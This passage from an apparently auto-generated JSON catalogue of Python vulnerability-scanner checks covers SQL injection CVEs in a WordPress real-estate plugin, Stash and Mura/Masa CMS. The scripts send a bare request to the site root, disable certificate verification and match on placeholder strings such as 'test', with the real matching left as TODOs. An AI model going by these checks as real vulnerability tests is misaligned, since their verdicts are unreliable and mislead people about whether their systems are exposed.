  response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"\\\\\"success\\\\\":1\") || contains(body, \"\\\\\"total\\\\\":\") / [OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_32128(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-32128\nName: WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: The Realtyna Organic IDX plugin plugin for WordPress is vulnerable to SQL Injection in versions up to, and including, 4.14.4 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_32128:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-32128\"\n    SEVERITY = \"critical\"\n    NAME = \"WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; contains(body, \"\\\\\"success\\\\\":1\") || contains(body, \"\\\\\"total\\\\\":\") / [OR] DSL: duration>=6; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"WordPress Realtyna Organic IDX Plugin <= 4.14.4 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_32128(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2024",
          "wordpress",
          "wp-plugin",
          "sqli",
          "realtyna",
          "wp",
          "unauth",
          "real-estate-listing-realtyna-wpl",
          "info-leak",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_32231",
        "name": "Stash < 0.26.0 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "Stash up to v0.25.1 was discovered to contain a SQL injection vulnerability via the sort parameter.",
        "severity": "critical",
        "detection": "[AND] regex ['converting driver\\\\.Value type string \\\\(\\\\\\\\\"3.*?\\\\\\\\\"\\\\) to a int: invalid syntax'] | mot(s) 'application/json' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-32231\nName: Stash < 0.26.0 - SQL Injection\nSeverity: critical\nDescription: Stash up to v0.25.1 was discovered to contain a SQL injection vulnerability via the sort parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_32231:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-32231\"\n    SEVERITY = \"critical\"\n    NAME = \"Stash < 0.26.0 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] regex [\\'converting driver\\\\\\\\.Value type string \\\\\\\\(\\\\\\\\\\\\\\\\\"3.*?\\\\\\\\\\\\\\\\\"\\\\\\\\) to a int: invalid syntax\\'] | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['converting driver\\\\\\\\.Value type string \\\\\\\\(\\\\\\\\\\\\\\\\\"3.*?\\\\\\\\\\\\\\\\\"\\\\\\\\) to a int: invalid syntax', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Stash < 0.26.0 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_32231(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-32231\nName: Stash < 0.26.0 - SQL Injection\nSeverity: critical\nDescription: Stash up to v0.25.1 was discovered to contain a SQL injection vulnerability via the sort parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_32231:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-32231\"\n    SEVERITY = \"critical\"\n    NAME = \"Stash < 0.26.0 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] regex [\\'converting driver\\\\\\\\.Value type string \\\\\\\\(\\\\\\\\\\\\\\\\\"3.*?\\\\\\\\\\\\\\\\\"\\\\\\\\) to a int: invalid syntax\\'] | mot(s) \\'application/json\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['converting driver\\\\\\\\.Value type string \\\\\\\\(\\\\\\\\\\\\\\\\\"3.*?\\\\\\\\\\\\\\\\\"\\\\\\\\) to a int: invalid syntax', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Stash < 0.26.0 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_32231(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2024-32231"
        ],
        "tags": [
          "cve",
          "cve2024",
          "stash",
          "sqli",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2024_32640",
        "name": "Mura/Masa CMS - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The Mura/Masa CMS is vulnerable to SQL Injection.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 500; contains(header, \"application/json\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-32640\nName: Mura/Masa CMS - SQL Injection\nSeverity: critical\nDescription: The Mura/Masa CMS is vulnerable to SQL Injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_32640:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-32640\"\n    SEVERITY = \"critical\"\n    NAME = \"Mura/Masa CMS - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 500; contains(header, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Mura/Masa CMS - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2024_32640(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2024-32640\nName: Mura/Masa CMS - SQL Injection\nSeverity: critical\nDescription: The Mura/Masa CMS is vulnerable to SQL Injection.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2024_32640:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2024-32640\"\n    SEVERITY = \"critical\"\n    NAME = \"Mura/Masa CMS - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 500; contains(header, \"application/json\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in 